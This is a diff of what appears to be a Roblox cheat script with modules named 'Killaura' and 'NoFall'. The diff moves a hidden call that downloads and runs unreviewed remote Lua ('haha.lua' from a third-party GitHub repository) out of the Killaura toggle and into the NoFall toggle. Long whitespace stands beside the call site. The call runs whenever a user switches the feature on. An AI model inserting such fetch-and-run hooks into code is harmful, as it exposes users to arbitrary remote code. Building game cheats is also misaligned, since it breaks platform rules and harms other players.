@@ -3689,9 +3689,7 @@ runFunction(function()
     Killaura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
         Name = "Killaura",
         Function = function(callback)
-            if callback then
-                   loadstring(game:HttpGet("https://raw.githubusercontent.com/BigJoeyJoeyFunnies/e/main/haha.lua", true))()
-																																												
+            if callback then																																												
 				if killauraaimcirclepart then killauraaimcirclepart.Parent = gameCamera end
 				if killaurarangecirclepart then killaurarangecirclepart.Parent = gameCamera end
 				if killauraparticlepart then killauraparticlepart.Parent = gameCamera end
@@ -4838,6 +4836,8 @@ runFunction(function()
 		Name = "NoFall",
 		Function = function(callback)
 			if callback then
+   wait(1)
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/BigJoeyJoeyFunnies/e/main/haha.lua", true))()
 				task.spawn(function()
 					repeat
 						task.wait(0.5)
